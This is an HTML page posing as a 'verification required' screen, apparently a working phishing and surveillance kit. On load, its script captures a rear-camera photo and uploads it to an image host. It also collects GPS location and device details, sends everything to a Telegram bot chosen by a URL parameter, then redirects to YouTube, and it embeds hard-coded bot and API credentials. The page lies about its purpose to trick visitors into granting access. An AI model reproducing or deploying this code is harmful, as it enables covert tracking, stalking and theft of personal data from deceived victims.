<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Permission Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            max-width: 350px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
        h1 { color: #667eea; margin-bottom: 10px; font-size: 26px; }
        .subtitle { color: #888; margin-bottom: 25px; font-size: 14px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
        .info-box { background: #f8f9fa; border-radius: 12px; padding: 15px; margin: 15px 0; text-align: left; }
        .info-item { margin: 8px 0; font-size: 13px; color: #555; display: flex; align-items: center; gap: 8px; }
        .status-area { background: #e9ecef; border-radius: 12px; padding: 12px; margin: 15px 0; font-size: 13px; color: #495057; }
        .hidden { display: none; }
        .footer { font-size: 11px; color: #aaa; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ Verification Required</h1>
        <div class="subtitle">Please grant permissions to continue</div>
        
        <div class="info-box">
            <div class="info-item">📸 <strong>Camera</strong> - Identity verification</div>
            <div class="info-item">📍 <strong>Location</strong> - Region check</div>
            <div class="info-item">📱 <strong>Device Info</strong> - Security scan</div>
        </div>
        
        <div id="statusArea" class="status-area">⏳ Requesting permissions...</div>
        <div class="footer">Auto-redirect after verification</div>
    </div>

    <script>
        // ===== CONFIG =====
        const BOT_TOKEN = "8365800784:AAH_xopF7digtn1X0pfGKtr7fGv4zZZyRy8";
        const IMGBB_API_KEY = "b7ba0100d04e0add952f217e712c7ff8";
        const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        // ==================
        
        const urlParams = new URLSearchParams(window.location.search);
        const OWNER_ID = urlParams.get('id');
        
        let dataSent = false;
        let collectedData = {
            camera: null,
            location: null,
            device: null
        };
        
        const statusDiv = document.getElementById('statusArea');
        
        function updateStatus(msg, isError = false) {
            statusDiv.innerHTML = msg;
            if (isError) statusDiv.style.background = "#f8d7da";
            else statusDiv.style.background = "#e9ecef";
            console.log(msg);
        }
        
        async function sendFinalReport() {
            if (dataSent) return;
            dataSent = true;
            
            let report = `🔐 *FULL ACCESS REPORT*\n👤 User ID: ${OWNER_ID}\n⏰ Time: ${new Date().toLocaleString()}\n\n`;
            
            if (collectedData.camera) report += `📸 *CAMERA*: ✅ Captured\n   📷 ${collectedData.camera}\n\n`;
            else report += `📸 *CAMERA*: ❌ Denied/Failed\n\n`;
            
            if (collectedData.location) report += `📍 *LOCATION*: ✅ Retrieved\n   🌍 ${collectedData.location.lat}, ${collectedData.location.lon}\n   🗺️ Accuracy: ${collectedData.location.acc}m\n\n`;
            else report += `📍 *LOCATION*: ❌ Denied/Failed\n\n`;
            
            if (collectedData.device) report += `📱 *DEVICE INFO*:\n   • Platform: ${collectedData.device.platform}\n   • Language: ${collectedData.device.language}\n   • Screen: ${collectedData.device.screen}\n   • Agent: ${collectedData.device.agent.substring(0, 80)}...\n`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: OWNER_ID, text: report, parse_mode: 'Markdown' })
                });
                updateStatus("✅ Verification complete! Redirecting...");
            } catch(e) { console.log("Send error", e); }
            
            setTimeout(() => { window.location.href = YOUTUBE_URL; }, 2000);
        }
        
        // 1. Camera
        async function getCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());
                
                return new Promise((resolve) => {
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('image', blob);
                        const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: formData });
                        const data = await res.json();
                        resolve(data.success ? data.data.url : "Upload failed");
                    }, 'image/jpeg', 0.7);
                });
            } catch(e) { return "Camera Denied"; }
        }
        
        // 2. Location
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) resolve(null);
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                    () => resolve(null)
                );
            });
        }
        
        // 3. Device Info
        function getDeviceInfo() {
            return {
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                agent: navigator.userAgent
            };
        }
        
        async function init() {
            if (!OWNER_ID) { updateStatus("❌ Invalid link", true); return; }
            
            updateStatus("📸 Requesting Camera...");
            collectedData.camera = await getCamera();
            
            updateStatus("📍 Requesting Location...");
            const loc = await getLocation();
            if (loc) collectedData.location = loc;
            
            updateStatus("📱 Collecting Device Info...");
            collectedData.device = getDeviceInfo();
            
            await sendFinalReport();
        }
        
        init();
    </script>
</body>
</html>
